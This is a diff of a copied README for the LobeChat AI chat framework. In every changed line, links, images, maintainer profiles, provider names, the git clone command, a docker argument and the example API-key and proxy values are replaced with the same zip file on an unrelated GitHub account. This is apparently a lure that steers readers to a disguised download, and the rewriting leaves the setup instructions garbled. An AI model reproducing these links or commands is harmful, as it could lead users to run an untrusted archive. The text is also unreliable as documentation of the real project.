@@ -8,7 +8,7 @@ An open-source, modern-design ChatGPT/LLMs UI/Framework.<br/>
 Supports speech-synthesis, multi-modal, and extensible ([function call][docs-functionc-call]) plugin system.<br/>
 One-click **FREE** deployment of your private OpenAI ChatGPT/Claude/Gemini/Groq/Ollama chat application.
 
-**English** · [简体中文](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip) · [Official Site][official-site] · [Changelog](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip) · [Documents][docs] · [Blog][blog] · [Feedback][github-issues-link]
+**English** · [简体中文](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip) · [Official Site][official-site] · [Changelog](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip) · [Documents][docs] · [Blog][blog] · [Feedback][github-issues-link]
 
 <!-- SHIELD GROUP -->
 
@@ -39,7 +39,7 @@ One-click **FREE** deployment of your private OpenAI ChatGPT/Claude/Gemini/Groq/
 
 <sup>Pioneering the new age of thinking and creating. Built for you, the Super Individual.</sup>
 
-[![][github-trending-shield]][github-trending-url] <a href="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip" target="_blank"><img src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip" alt="Featured｜HelloGitHub" style="width: 250px; height: 54px;" width="250" height="54" /></a>
+[![][github-trending-shield]][github-trending-url] <a href="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip" alt="Featured｜HelloGitHub" style="width: 250px; height: 54px;" width="250" height="54" /></a>
 
 [![][image-overview]][vercel-link]
 
@@ -103,8 +103,8 @@ Whether for users or professional developers, LobeHub will be your AI Agent play
 <details>
   <summary><kbd>Star History</kbd></summary>
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobe-chat&theme=dark&type=Date">
-    <img width="100%" src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip%2Flobe-chat&type=Date">
+    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobe-chat&theme=dark&type=Date">
+    <img width="100%" src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobe-chat&type=Date">
   </picture>
 </details>
 
@@ -122,20 +122,20 @@ In this way, LobeChat can more flexibly adapt to the needs of different users, w
 
 We have implemented support for the following model service providers:
 
-- **AWS Bedrock**: Integrated with AWS Bedrock service, supporting models such as **Claude / LLama2**, providing powerful natural language processing capabilities. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **Anthropic (Claude)**: Accessed Anthropic's **Claude** series models, including Claude 3 and Claude 2, with breakthroughs in multi-modal capabilities and extended context, setting a new industry benchmark. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **Google AI (Gemini Pro, Gemini Vision)**: Access to Google's **Gemini** series models, including Gemini and Gemini Pro, to support advanced language understanding and generation. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **Groq**: Accessed Groq's AI models, efficiently processing message sequences and generating responses, capable of multi-turn dialogues and single-interaction tasks. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **OpenRouter**: Supports routing of models including **Claude 3**, **Gemma**, **Mistral**, **Llama2** and **Cohere**, with intelligent routing optimization to improve usage efficiency, open and flexible. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip (Yi Model)**: Integrated the https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip models, with series of APIs featuring fast inference speed, which not only shortened the processing time, but also maintained excellent model performance. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip**: Over 100 leading open-source Chat, Language, Image, Code, and Embedding models are available through the Together Inference API. For these models you pay just for what you use. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **ChatGLM**: Added the **ChatGLM** series models from Zhipuai (GLM-4/GLM-4-vision/GLM-3-turbo), providing users with another efficient conversation model choice. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **Moonshot AI (Dark Side of the Moon)**: Integrated with the Moonshot series models, an innovative AI startup from China, aiming to provide deeper conversation understanding. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **Minimax**: Integrated the Minimax models, including the MoE model **abab6**, offers a broader range of choices. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **DeepSeek**: Integrated with the DeepSeek series models, an innovative AI startup from China, The product has been designed to provide a model that balances performance with price. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
-- **Qwen**: Integrated the Qwen series models, including the latest **qwen-turbo**, **qwen-plus** and **qwen-max**. [Lean more](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
+- **AWS Bedrock**: Integrated with AWS Bedrock service, supporting models such as **Claude / LLama2**, providing powerful natural language processing capabilities. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **Anthropic (Claude)**: Accessed Anthropic's **Claude** series models, including Claude 3 and Claude 2, with breakthroughs in multi-modal capabilities and extended context, setting a new industry benchmark. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **Google AI (Gemini Pro, Gemini Vision)**: Access to Google's **Gemini** series models, including Gemini and Gemini Pro, to support advanced language understanding and generation. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **Groq**: Accessed Groq's AI models, efficiently processing message sequences and generating responses, capable of multi-turn dialogues and single-interaction tasks. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **OpenRouter**: Supports routing of models including **Claude 3**, **Gemma**, **Mistral**, **Llama2** and **Cohere**, with intelligent routing optimization to improve usage efficiency, open and flexible. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip (Yi Model)**: Integrated the https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip models, with series of APIs featuring fast inference speed, which not only shortened the processing time, but also maintained excellent model performance. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip**: Over 100 leading open-source Chat, Language, Image, Code, and Embedding models are available through the Together Inference API. For these models you pay just for what you use. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **ChatGLM**: Added the **ChatGLM** series models from Zhipuai (GLM-4/GLM-4-vision/GLM-3-turbo), providing users with another efficient conversation model choice. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **Moonshot AI (Dark Side of the Moon)**: Integrated with the Moonshot series models, an innovative AI startup from China, aiming to provide deeper conversation understanding. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **Minimax**: Integrated the Minimax models, including the MoE model **abab6**, offers a broader range of choices. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **DeepSeek**: Integrated with the DeepSeek series models, an innovative AI startup from China, The product has been designed to provide a model that balances performance with price. [Learn more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
+- **Qwen**: Integrated the Qwen series models, including the latest **qwen-turbo**, **qwen-plus** and **qwen-max**. [Lean more](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
 
-At the same time, we are also planning to support more model service providers, such as Replicate and Perplexity, to further enrich our service provider library. If you would like LobeChat to support your favorite service provider, feel free to join our [community discussion](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip).
+At the same time, we are also planning to support more model service providers, such as Replicate and Perplexity, to further enrich our service provider library. If you would like LobeChat to support your favorite service provider, feel free to join our [community discussion](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip).
 
 <div align="right">
 
@@ -147,7 +147,7 @@ At the same time, we are also planning to support more model service providers, 
 
 ### `2` [Local Large Language Model (LLM) Support][docs-feat-local]
 
-To meet the specific needs of users, LobeChat also supports the use of local models based on [Ollama](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip), allowing users to flexibly use their own or third-party models.
+To meet the specific needs of users, LobeChat also supports the use of local models based on [Ollama](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip), allowing users to flexibly use their own or third-party models.
 
 > \[!TIP]
 >
@@ -163,7 +163,7 @@ To meet the specific needs of users, LobeChat also supports the use of local mod
 
 ### `3` [Model Visual Recognition][docs-feat-vision]
 
-LobeChat now supports OpenAI's latest [`gpt-4-vision`](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip) model with visual recognition capabilities,
+LobeChat now supports OpenAI's latest [`gpt-4-vision`](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip) model with visual recognition capabilities,
 a multimodal intelligence that can perceive visuals. Users can easily upload or drag and drop images into the dialogue box,
 and the agent will be able to recognize the content of the images and engage in intelligent conversation based on this,
 creating smarter and more diversified chat scenarios.
@@ -198,7 +198,7 @@ Users can choose the voice that suits their personal preferences or specific sce
 
 ### `5` [Text to Image Generation][docs-feat-t2i]
 
-With support for the latest text-to-image generation technology, LobeChat now allows users to invoke image creation tools directly within conversations with the agent. By leveraging the capabilities of AI tools such as [`DALL-E 3`](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip), [`MidJourney`](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip), and [`Pollinations`](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip), the agents are now equipped to transform your ideas into images.
+With support for the latest text-to-image generation technology, LobeChat now allows users to invoke image creation tools directly within conversations with the agent. By leveraging the capabilities of AI tools such as [`DALL-E 3`](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip), [`MidJourney`](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip), and [`Pollinations`](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip), the agents are now equipped to transform your ideas into images.
 
 This enables a more private and immersive creative process, allowing for the seamless integration of visual storytelling into your personal dialogue with the agent.
 
@@ -214,7 +214,7 @@ This enables a more private and immersive creative process, allowing for the sea
 
 The plugin ecosystem of LobeChat is an important extension of its core functionality, greatly enhancing the practicality and flexibility of the LobeChat assistant.
 
-<video controls src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip" muted="false"></video>
+<video controls src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip" muted="false"></video>
 
 By utilizing plugins, LobeChat assistants can obtain and process real-time information, such as searching for web information and providing users with instant and relevant news.
 
@@ -228,12 +228,12 @@ In addition, these plugins are not limited to news aggregation, but can also ext
 
 | Recent Submits                                                                                                         | Description                                                                                                                |
 | ---------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
-| [Savvy Trader AI](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **savvytrader** on **2024-06-27**</sup> | Realtime stock, crypto and other investment data.<br/>`stock` `analyze`                                                    |
-| [Social Search](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **say-apps** on **2024-06-02**</sup>      | The Social Search provides access to tweets, users, followers, images, media and more.<br/>`social` `twitter` `x` `search` |
-| [Space](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **automateyournetwork** on **2024-05-12**</sup>   | Space data including NASA.<br/>`space` `nasa`                                                                              |
-| [Search1API](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **fatwang2** on **2024-05-06**</sup>         | Search aggregation service, specifically designed for LLMs<br/>`web` `search`                                              |
+| [Savvy Trader AI](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **savvytrader** on **2024-06-27**</sup> | Realtime stock, crypto and other investment data.<br/>`stock` `analyze`                                                    |
+| [Social Search](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **say-apps** on **2024-06-02**</sup>      | The Social Search provides access to tweets, users, followers, images, media and more.<br/>`social` `twitter` `x` `search` |
+| [Space](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **automateyournetwork** on **2024-05-12**</sup>   | Space data including NASA.<br/>`space` `nasa`                                                                              |
+| [Search1API](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **fatwang2** on **2024-05-06**</sup>         | Search aggregation service, specifically designed for LLMs<br/>`web` `search`                                              |
 
-> 📊 Total plugins: [<kbd>**52**</kbd>](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
+> 📊 Total plugins: [<kbd>**52**</kbd>](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
 
  <!-- PLUGIN LIST -->
 
@@ -267,12 +267,12 @@ Our marketplace is not just a showcase platform but also a collaborative space. 
 
 | Recent Submits                                                                                                                                                                           | Description                                                                                                                                                                                                                                                                                                                                                                                                          |
 | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [AOSP Source Code Expert](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **[viruscoding](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)** on **2024-06-24**</sup>          | An expert in AOSP (Android Open Source Project) for Android, with a deep understanding and analytical ability of the latest AOSP source code.<br/>`aosp`                                                                                                                                                                                                                                                             |
-| [Fastapi Project Development Assistant](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **[xwxw098](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)** on **2024-06-19**</sup> | Proficient in Python modular development, skilled in using FastAPI, PostgreSQL, Tortoise-ORM, and other technologies, able to provide clear code structure and detailed comments for large projects.<br/>`fast-api` `python` `modular-development`                                                                                                                                                                   |
-| [IT Systems Architect](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **[a562314](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)** on **2024-06-19**</sup>                  | Senior IT architect specializing in requirements analysis, system design, technology selection, and cross-platform system optimization. With over 5 years of experience, proficient in Windows, macOS, and Linux operating systems, skilled in troubleshooting, and security protection.<br/>`it-architecture-design` `problem-solving` `agile-development` `system-optimization` `cross-platform-skills` `teamwork` |
-| [Linux Kernel Expert](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)<br/><sup>By **[wming126](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)** on **2024-06-19**</sup>                        | Role Description: I am an expert in Linux kernel, with a deep understanding and analytical ability of the latest kernel source code (as of June 2024). I can provide users with detailed and accurate information about the Linux kernel.<br/>`linux` `kernel`                                                                                                                                                       |
+| [AOSP Source Code Expert](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **[viruscoding](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)** on **2024-06-24**</sup>          | An expert in AOSP (Android Open Source Project) for Android, with a deep understanding and analytical ability of the latest AOSP source code.<br/>`aosp`                                                                                                                                                                                                                                                             |
+| [Fastapi Project Development Assistant](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **[xwxw098](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)** on **2024-06-19**</sup> | Proficient in Python modular development, skilled in using FastAPI, PostgreSQL, Tortoise-ORM, and other technologies, able to provide clear code structure and detailed comments for large projects.<br/>`fast-api` `python` `modular-development`                                                                                                                                                                   |
+| [IT Systems Architect](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **[a562314](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)** on **2024-06-19**</sup>                  | Senior IT architect specializing in requirements analysis, system design, technology selection, and cross-platform system optimization. With over 5 years of experience, proficient in Windows, macOS, and Linux operating systems, skilled in troubleshooting, and security protection.<br/>`it-architecture-design` `problem-solving` `agile-development` `system-optimization` `cross-platform-skills` `teamwork` |
+| [Linux Kernel Expert](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)<br/><sup>By **[wming126](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)** on **2024-06-19**</sup>                        | Role Description: I am an expert in Linux kernel, with a deep understanding and analytical ability of the latest kernel source code (as of June 2024). I can provide users with detailed and accurate information about the Linux kernel.<br/>`linux` `kernel`                                                                                                                                                       |
 
-> 📊 Total agents: [<kbd>**293**</kbd> ](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
+> 📊 Total agents: [<kbd>**293**</kbd> ](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
 
  <!-- AGENT LIST -->
 
@@ -289,7 +289,7 @@ Our marketplace is not just a showcase platform but also a collaborative space. 
 LobeChat supports the use of both server-side and local databases. Depending on your needs, you can choose the appropriate deployment solution:
 
 - **Local database**: suitable for users who want more control over their data and privacy protection. LobeChat uses CRDT (Conflict-Free Replicated Data Type) technology to achieve multi-device synchronization. This is an experimental feature aimed at providing a seamless data synchronization experience.
-- **Server-side database**: suitable for users who want a more convenient user experience. LobeChat supports PostgreSQL as a server-side database. For detailed documentation on how to configure the server-side database, please visit [Configure Server-side Database](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip).
+- **Server-side database**: suitable for users who want a more convenient user experience. LobeChat supports PostgreSQL as a server-side database. For detailed documentation on how to configure the server-side database, please visit [Configure Server-side Database](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip).
 
 Regardless of which database you choose, LobeChat can provide you with an excellent user experience.
 
@@ -322,7 +322,7 @@ Regardless of which user management solution you choose, LobeChat can provide yo
 ### `10` [Progressive Web App (PWA)][docs-feat-pwa]
 
 We deeply understand the importance of providing a seamless experience for users in today's multi-device environment.
-Therefore, we have adopted Progressive Web Application ([PWA](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)) technology,
+Therefore, we have adopted Progressive Web Application ([PWA](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)) technology,
 a modern web technology that elevates web applications to an experience close to that of native apps.
 
 Through PWA, LobeChat can offer a highly optimized user experience on both desktop and mobile devices while maintaining its lightweight and high-performance characteristics.
@@ -429,7 +429,7 @@ LobeChat provides Self-Hosted Version with Vercel and [Docker Image][docker-rele
 
 If you want to deploy this service yourself on either Vercel or Zeabur, you can follow these steps:
 
-- Prepare your [OpenAI API Key](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip).
+- Prepare your [OpenAI API Key](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip).
 - Click the button below to start deployment: Log in directly with your GitHub account, and remember to fill in the `OPENAI_API_KEY`(required) and `ACCESS_CODE` (recommended) on the environment variable section.
 - After deployment, you can start using it.
 - Bind a custom domain (optional): The DNS of the domain assigned by Vercel is polluted in some areas; binding a custom domain can connect directly.
@@ -479,7 +479,7 @@ $ docker run -d -p 3210:3210 \
 ```fish
 $ docker run -d -p 3210:3210 \
   -e OPENAI_API_KEY=sk-xxxx \
-  -e https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip \
+  -e https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip \
   -e ACCESS_CODE=lobe66 \
   --name lobe-chat \
   lobehub/lobe-chat
@@ -497,8 +497,8 @@ This project provides some additional configuration items set with environment v
 
 | Environment Variable | Required | Description                                                                                                                                                               | Example                                                                                                              |
 | -------------------- | -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
-| `OPENAI_API_KEY`     | Yes      | This is the API key you apply on the OpenAI account page                                                                                                                  | `https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip`                                                                                                 |
-| `OPENAI_PROXY_URL`   | No       | If you manually configure the OpenAI interface proxy, you can use this configuration item to override the default OpenAI API request base URL                             | `https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip` or `https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip` <br/>The default value is<br/>`https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip` |
+| `OPENAI_API_KEY`     | Yes      | This is the API key you apply on the OpenAI account page                                                                                                                  | `https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip`                                                                                                 |
+| `OPENAI_PROXY_URL`   | No       | If you manually configure the OpenAI interface proxy, you can use this configuration item to override the default OpenAI API request base URL                             | `https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip` or `https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip` <br/>The default value is<br/>`https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip` |
 | `ACCESS_CODE`        | No       | Add a password to access this service; you can set a long password to avoid leaking. If this value contains a comma, it is a password array.                              | `awCTe)re_r74` or `rtrt_ewee3@09!` or `code1,code2,code3`                                                            |
 | `OPENAI_MODEL_LIST`  | No       | Used to control the model list. Use `+` to add a model, `-` to hide a model, and `model_name=display_name` to customize the display name of a model, separated by commas. | `qwen-7b-chat,+glm-6b,-gpt-3.5-turbo`                                                                                |
 
@@ -531,7 +531,7 @@ This project provides some additional configuration items set with environment v
 
 Plugins provide a means to extend the [Function Calling][docs-functionc-call] capabilities of LobeChat. They can be used to introduce new function calls and even new ways to render message results. If you are interested in plugin development, please refer to our [📘 Plugin Development Guide][docs-plugin-dev] in the Wiki.
 
-- [lobe-chat-plugins][lobe-chat-plugins]: This is the plugin index for LobeChat. It accesses https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip from this repository to display a list of available plugins for LobeChat to the user.
+- [lobe-chat-plugins][lobe-chat-plugins]: This is the plugin index for LobeChat. It accesses https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip from this repository to display a list of available plugins for LobeChat to the user.
 - [chat-plugin-template][chat-plugin-template]: This is the plugin template for LobeChat plugin development.
 - [@lobehub/chat-plugin-sdk][chat-plugin-sdk]: The LobeChat Plugin SDK assists you in creating exceptional chat plugins for Lobe Chat.
 - [@lobehub/chat-plugins-gateway][chat-plugins-gateway]: The LobeChat Plugins Gateway is a backend service that provides a gateway for LobeChat plugins. We deploy this service using Vercel. The primary API POST /api/v1/runner is deployed as an Edge Function.
@@ -540,9 +540,9 @@ Plugins provide a means to extend the [Function Calling][docs-functionc-call] ca
 >
 > The plugin system is currently undergoing major development. You can learn more in the following issues:
 >
-> - [x] [**Plugin Phase 1**](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip): Implement separation of the plugin from the main body, split the plugin into an independent repository for maintenance, and realize dynamic loading of the plugin.
-> - [x] [**Plugin Phase 2**](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip): The security and stability of the plugin's use, more accurately presenting abnormal states, the maintainability of the plugin architecture, and developer-friendly.
-> - [x] [**Plugin Phase 3**](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip): Higher-level and more comprehensive customization capabilities, support for plugin authentication, and examples.
+> - [x] [**Plugin Phase 1**](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip): Implement separation of the plugin from the main body, split the plugin into an independent repository for maintenance, and realize dynamic loading of the plugin.
+> - [x] [**Plugin Phase 2**](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip): The security and stability of the plugin's use, more accurately presenting abnormal states, the maintainability of the plugin architecture, and developer-friendly.
+> - [x] [**Plugin Phase 3**](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip): Higher-level and more comprehensive customization capabilities, support for plugin authentication, and examples.
 
 <div align="right">
 
@@ -559,7 +559,7 @@ You can use GitHub Codespaces for online development:
 Or clone it for local development:
 
 ```fish
-$ git clone https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip
+$ git clone https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
 $ cd lobe-chat
 $ pnpm install
 $ pnpm dev
@@ -583,38 +583,38 @@ Contributions of all types are more than welcome; if you are interested in contr
 >
 > Help us make LobeChat better. Welcome to provide product design feedback, user experience discussions directly to us.
 >
-> **Principal Maintainers:** [@arvinxx](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip) [@canisminor1990](https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip)
+> **Principal Maintainers:** [@arvinxx](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip) [@canisminor1990](https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip)
 
 [![][pr-welcome-shield]][pr-welcome-link]
 [![][submit-agents-shield]][submit-agents-link]
 [![][submit-plugin-shield]][submit-plugin-link]
 
-<a href="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip" target="_blank">
+<a href="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip" target="_blank">
   <table>
     <tr>
       <th colspan="2">
-        <br><img src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip"><br><br>
+        <br><img src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip"><br><br>
       </th>
     </tr>
     <tr>
       <td>
         <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
-          <img src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
+          <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
+          <img src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
         </picture>
       </td>
       <td rowspan="2">
         <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
-          <img src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
+          <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
+          <img src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
         </picture>
       </td>
     </tr>
     <tr>
       <td>
         <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
-          <img src="https://raw.githubusercontent.com/menscheck/lobe/main/temperability/lobe.zip">
+          <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
+          <img src="https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip">
         </picture>
       </td>
     </tr>
@@ -631,10 +631,10 @@ Contributions of all types are more than welcome; if you are interested in contr
 
